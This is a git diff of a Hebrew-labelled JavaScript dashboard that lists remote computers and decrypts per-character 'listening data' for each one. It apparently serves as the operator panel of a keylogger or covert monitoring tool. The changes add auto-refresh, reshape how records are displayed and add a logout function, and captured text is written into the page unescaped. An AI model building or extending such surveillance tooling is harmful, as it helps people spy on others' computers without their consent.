@@ -147,6 +147,9 @@ function renderComputersList(computersList) {
     tableBody.innerHTML = '';
 
     computersList.forEach(computer => {
+
+        const hasData = computer.data !== false;
+
         const tr = document.createElement('tr');
         tr.innerHTML = `
             <td>${computer.name}</td>
@@ -156,12 +159,26 @@ function renderComputersList(computersList) {
             <td>
                 <button onclick="removeComputer('${computer.ip}')">מחק</button>
                 <button onclick="showMonitoring('${computer.ip}')">מעקב</button>
-                <button onclick="showListeningData('${computer.ip}')" ${!computer.data ? 'disabled' : ''}>צפה בהאזנות</button>
+                <button onclick="showListeningData('${computer.ip}')" ${!hasData ? 'disabled' : ''}>צפה בהאזנות</button>
             </td>
         `;
         tableBody.appendChild(tr);
     });
 }
+
+function startPeriodicRefresh() {
+    setInterval(() => {
+        if (document.getElementById('computers-list').offsetParent !== null) {
+            updateComputersList();
+        }
+    }, 30000); 
+}
+
+
+document.addEventListener('DOMContentLoaded', () => {
+    
+    startPeriodicRefresh();
+});
 
 
 async function showMonitoring(ip) {
@@ -209,6 +226,7 @@ async function showListeningData(ip) {
         }
         
         const data = await response.json();
+        console.log("Listening data:", data);
         
         const computer = computers.find(computer => computer.ip === ip);
         const computerName = computer ? computer.name : 'לא ידוע';
@@ -218,18 +236,19 @@ async function showListeningData(ip) {
 
         let contentHTML = '<div class="listening-records">';
         
-        if (Array.isArray(data)) {
-
+        if (Object.keys(data).length === 0) {
+            contentHTML += '<div class="empty-data">אין נתוני האזנה זמינים</div>';
+        } else if (Array.isArray(data)) {
             for (const record of data) {
                 contentHTML += formatListeningRecord(record);
             }
         } else {
-
             for (const timestamp in data) {
                 contentHTML += `<div class="timestamp-header">${timestamp}</div>`;
                 contentHTML += formatListeningRecord(data[timestamp]);
             }
         }
+        
         
         contentHTML += '</div>';
 
@@ -246,35 +265,60 @@ async function showListeningData(ip) {
                 </div>
             </div>
         `;
-    } catch (error) {
-        console.error("שגיאה בטעינת נתוני האזנה:", error);
+
+        } catch (error) {
+            console.error("שגיאה בטעינת נתוני האזנה:", error);
         alert("שגיאה בטעינת נתוני האזנה");
     }
 }
 
 
 function formatListeningRecord(record) {
+    let recordHTML = '<div class="record-content">';
+    
     if (Array.isArray(record)) {
-        try {
-            const decrypted = record.map(char => decryptData(char)).join('');
-            return `<div class="listening-entry">
-                <div class="raw-data" style="display:none">${JSON.stringify(record)}</div>
-                <div class="decrypted-data">${decrypted}</div>
-            </div>`;
-        } catch (e) {
-            return `<div class="listening-entry error">שגיאה בפענוח: ${e.message}</div>`;
-        }
+        const decrypted = record.map(char => decryptData(char)).join('');
+        recordHTML += `<div class="record-text">${decrypted}</div>`;
     } else if (typeof record === 'object') {
-        let html = '<div class="listening-entry">';
         for (const key in record) {
-            html += `<div><strong>${key}:</strong> ${JSON.stringify(record[key])}</div>`;
+            if (Array.isArray(record[key])) {
+                const decrypted = record[key].map(char => decryptData(char)).join('');
+                recordHTML += `<div class="record-entry"><span class="timestamp">${key}:</span> ${decrypted}</div>`;
+            } else {
+                recordHTML += `<div class="record-entry"><span class="timestamp">${key}:</span> ${record[key]}</div>`;
+            }
         }
-        html += '</div>';
-        return html;
     } else {
-        return `<div class="listening-entry">${record}</div>`;
+        recordHTML += `<div class="record-text">${record}</div>`;
+    }
+    
+    recordHTML += '</div>';
+    return recordHTML;
+}
+
+
+
+
+function logout() {
+    localStorage.removeItem('username');
+    const loginPage = document.getElementById('login-page');
+    const dashboardPage = document.getElementById('dashboard-page');
+    
+    if (loginPage && dashboardPage) {
+        loginPage.style.display = 'block';
+        dashboardPage.style.display = 'none';
+        
+        const usernameField = document.getElementById('username');
+        const passwordField = document.getElementById('password');
+        if (usernameField) usernameField.value = '';
+        if (passwordField) passwordField.value = '';
+    } else {
+        console.error("Cannot find login or dashboard elements");
+        window.location.href = window.location.pathname;
     }
 }
+
+
 
 
 function decryptData(encryptedData, key = "F") {
